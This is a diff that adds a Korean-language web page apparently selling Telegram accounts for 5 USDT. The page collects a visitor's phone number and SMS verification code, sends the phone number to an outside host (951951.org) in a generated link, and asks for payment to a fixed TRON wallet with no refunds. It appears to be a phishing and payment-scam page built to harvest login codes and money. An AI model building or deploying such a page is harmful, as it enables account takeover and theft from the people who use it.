@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> 텔레그램 계정 구매</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f1a;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            color: #667eea;
+            margin-bottom: 30px;
+        }
+        .step {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        .step h3 {
+            color: #667eea;
+            margin-bottom: 12px;
+        }
+        .step p {
+            color: #aaa;
+            font-size: 14px;
+        }
+        .price {
+            text-align: center;
+            font-size: 24px;
+            color: #f093fb;
+            margin: 20px 0;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .warning {
+            background: #ff9f4320;
+            border: 1px solid #ff9f43;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 13px;
+            color: #ff9f43;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛒 텔레그램 계정 구매</h1>
+        
+        <div class="price">5 USDT / 계정</div>
+        
+        <div class="step">
+            <h3>📱 1단계: 전화번호 입력</h3>
+            <p>구매할 전화번호를 입력하세요.<br>
+            자동으로 국가 코드가 설정됩니다.</p>
+            <input type="tel" placeholder="01012345678" 
+                   style="width: 100%; padding: 14px; background: #0f0f1a; 
+                   border: 1px solid #333; border-radius: 8px; color: #fff; 
+                   font-size: 16px; margin-top: 10px;">
+        </div>
+        
+        <div class="step">
+            <h3>🔗 2단계: 인증 코드 요청</h3>
+            <p>아래 버튼을 클릭하면<br>
+            인증 코드 요청 링크가 생성됩니다.<br>
+            링크를 클릭하여 인증을 완료하세요.</p>
+            <button class="btn" onclick="requestCode()">
+                🔗 인증 코드 요청하기
+            </button>
+        </div>
+        
+        <div class="step">
+            <h3>📲 3단계: SMS 인증</h3>
+            <p>SMS로 전송된 인증 코드를<br>
+            입력하세요.<br>
+            <strong>30분 이내에 입력</strong>해주세요.</p>
+            <input type="text" placeholder="인증 코드 입력" 
+                   style="width: 100%; padding: 14px; background: #0f0f1a; 
+                   border: 1px solid #333; border-radius: 8px; color: #fff; 
+                   font-size: 16px; margin-top: 10px;" maxlength="6">
+        </div>
+        
+        <div class="step">
+            <h3>💰 4단계: 결제</h3>
+            <p>아래 지갑 주소로 결제하세요:</p>
+            <div style="background: #0f0f1a; padding: 12px; border-radius: 8px; 
+                        font-family: monospace; font-size: 12px; word-break: break-all;
+                        margin: 10px 0;">
+                TWk75rL7Y7yS2eLZhLEpA7UeVVWpTJTih4
+            </div>
+            <p style="font-size: 13px; color: #888;">
+                • TRX 또는 USDT(TRC20) 지원<br>
+                • 결제 기한: 30분
+            </p>
+        </div>
+        
+        <div class="step">
+            <h3>📦 5단계: 계정 수령</h3>
+            <p>결제 확인 후 자동으로<br>
+            텔레그램 계정 정보를 받으세요.</p>
+            <button class="btn" style="background: linear-gradient(135deg, #11998e, #38ef7d);">
+                ✅ 결제 확인
+            </button>
+        </div>
+        
+        <div class="warning">
+            ⚠️ 주의사항<br>
+            • 인증 코드는 30분 동안 유효합니다<br>
+            • 결제는 30분 이내에 완료해주세요<br>
+            • 환불은 불가능합니다
+        </div>
+        
+        <div style="text-align: center; margin-top: 30px; color: #666; font-size: 12px;">
+            문의: @Shop_idbot<br>
+            © 2024 TRON Shop
+        </div>
+    </div>
+    
+    <script>
+        function requestCode() {
+            // 실제 구현: 백엔드 API 호출
+            const phone = document.querySelector('input[type="tel"]').value;
+            if (!phone) {
+                alert('전화번호를 입력해주세요.');
+                return;
+            }
+            
+            // 링크 생성 (실제로는 백엔드 API)
+            const link = `https://951951.org/verify?phone=${encodeURIComponent(phone)}&token=${Date.now()}`;
+            
+            // 클립보드에 복사
+            navigator.clipboard.writeText(link).then(() => {
+                alert('링크가 복사되었습니다!\n\n1. 링크를 클릭하세요\n2. 인증 코드를 요청하세요\n3. SMS로 코드를 받으세요');
+                
+                // 브라우저에서 열기
+                window.open(link, '_blank');
+            }).catch(() => {
+                prompt('아래 링크를 클릭하세요:', link);
+            });
+        }
+    </script>
+</body>
+</html>
